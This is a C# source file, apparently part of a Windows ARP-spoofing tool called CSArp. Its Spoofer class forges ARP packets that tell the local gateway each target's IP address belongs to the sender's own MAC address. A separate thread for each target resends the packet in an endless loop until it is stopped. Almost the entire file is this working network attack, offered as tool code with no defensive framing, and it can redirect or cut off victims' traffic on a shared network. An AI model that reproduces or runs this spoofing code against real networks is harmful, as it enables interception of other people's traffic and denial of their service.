﻿using System.Collections.Generic;
using System.Net;
using SharpPcap;
using PacketDotNet;
using System.Net.NetworkInformation;
using System.Threading;
using SharpPcap.WinPcap;
using CSArp.View;
using CSArp.Model.Utilities;
using CSArp.Model.Extensions;

namespace CSArp.Model
{
    public static class Spoofer
    {
        private static Dictionary<IPAddress, PhysicalAddress> engagedclientlist;
        private static bool disengageflag = true;

        public static void Start(Dictionary<IPAddress, PhysicalAddress> targetlist, IPAddress gatewayipaddress, PhysicalAddress gatewaymacaddress, WinPcapDevice captureDevice)
        {
            engagedclientlist = new Dictionary<IPAddress, PhysicalAddress>();
            captureDevice.Open();
            foreach (var target in targetlist)
            {
                var myipaddress = captureDevice.ReadCurrentIpV4Address();
                var arppacketforgatewayrequest = new ARPPacket(ARPOperation.Request, "00-00-00-00-00-00".Parse(), gatewayipaddress, captureDevice.MacAddress, target.Key);
                var ethernetpacketforgatewayrequest = new EthernetPacket(captureDevice.MacAddress, gatewaymacaddress, EthernetPacketType.Arp);
                ethernetpacketforgatewayrequest.PayloadPacket = arppacketforgatewayrequest;
                ThreadBuffer.Add(new Thread(() =>
                    SendSpoofingPacket(target.Key, target.Value, ethernetpacketforgatewayrequest, captureDevice)
                  ));
                engagedclientlist.Add(target.Key, target.Value);
            };
        }
        public static void StopAll()
        {
            disengageflag = true;
            if (engagedclientlist != null)
            {
                engagedclientlist.Clear();
            }
        }
        private static void SendSpoofingPacket(IPAddress ipAddress, PhysicalAddress physicalAddress, EthernetPacket ethernetpacketforgatewayrequest, WinPcapDevice captureDevice)
        {

            disengageflag = false;
            DebugOutput.Print("Spoofing target " + physicalAddress.ToString() + " @ " + ipAddress.ToString());
            try
            {
                while (!disengageflag)
                {
                    captureDevice.SendPacket(ethernetpacketforgatewayrequest);
                }
            }
            catch (PcapException ex)
            {
                DebugOutput.Print("PcapException @ DisconnectReconnect.Disconnect() [" + ex.Message + "]");
            }
            DebugOutput.Print("Spoofing thread @ DisconnectReconnect.Disconnect() for " + physicalAddress.ToString() + " @ " + ipAddress.ToString() + " is terminating.");
        }
    }
}
